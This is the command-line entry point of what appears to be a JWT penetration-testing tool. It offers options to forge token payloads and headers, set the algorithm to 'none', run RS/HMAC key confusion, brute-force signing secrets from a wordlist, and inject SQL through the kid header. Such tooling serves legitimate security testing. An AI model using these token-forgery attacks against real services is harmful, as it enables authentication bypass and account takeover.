import json
import sys

import click
from os import path
from MyJWT.modifyJWT import changePayload, addheader, changeAlg, signature, addpayload
from MyJWT.utils import jwtToJson, encodeJwt
from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, checkHmac, printDecoded


@click.command()
@click.argument('jwt')
@click.option("--print", is_flag=True, help="Print Decoded JWT")
@click.option("--payload", "-p", help="New payload json format")
@click.option("--add-header", multiple=True)
@click.option("--add-payload", multiple=True)
@click.option("--sign")
@click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability")
@click.option("--hmac", help="Check RS/HMAC Alg vulnerability")
@click.option("--bruteforce", help="Bruteforce to guess th secret used to sign the token")
@click.option("--verify")
@click.option("--kid", help="Kid Injection sql")
def main(jwt, print, payload, add_header, add_payload, sign, none_vulnerability, hmac, bruteforce, verify, kid):
    if payload:
        jwtJson = changePayload(jwtToJson(jwt), json.loads(payload))
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
    if add_payload:
        payloadDict = dict()
        for payload in add_payload:
            newStr = payload.split("=")
            payloadDict[newStr[0]] = newStr[1]
        jwtJson = addpayload(jwtToJson(jwt), payloadDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]

    if add_header:
        headerDict = dict()
        for header in add_header:
            newStr = header.split("=")
            headerDict[newStr[0]] = newStr[1]
        jwtJson = addheader(jwtToJson(jwt), headerDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
    if kid:
        jwt = injectSqlKid(jwt, kid)
    if bruteforce:
        if path.exists(bruteforce):
            bruteforceDict(jwt, bruteforce)
            sys.exit()
        else:
            click.echo("File not found")
            sys.exit()
    if hmac:
        if path.exists(hmac):
            jwt = checkHmac(jwtToJson(jwt), hmac)
            click.echo(f"\nnew JWT: {jwt}")
        else:
            click.echo("File not found")
            sys.exit()
    if none_vulnerability:
        jwtJson = changeAlg(jwtToJson(jwt), "none")
        jwt = encodeJwt(jwtJson) + "."
        click.echo(jwt)
        sys.exit()
    if sign:
        jwt = signature(jwtToJson(jwt), sign)
    if verify:
        newJwt = signature(jwtToJson(jwt), verify)
        click.echo("yes" if newJwt.split('.')[2] == jwt.split('.')[2] else "no")
        sys.exit()
    if print:
        printDecoded(jwt)
        sys.exit()
    click.echo(jwt)


if __name__ == '__main__':
    main()
